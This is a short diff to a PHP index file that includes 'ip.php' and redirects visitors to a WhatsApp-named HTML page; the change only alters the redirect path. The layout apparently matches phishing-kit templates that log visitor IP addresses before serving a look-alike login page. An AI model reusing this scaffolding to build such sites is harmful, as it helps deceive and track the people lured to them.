@@ -1,6 +1,6 @@
 <?php
 include 'ip.php';
 
-header('Location: whatsapp.html');
+header('Location: /www/whatsapp.html');
 exit;
 ?>
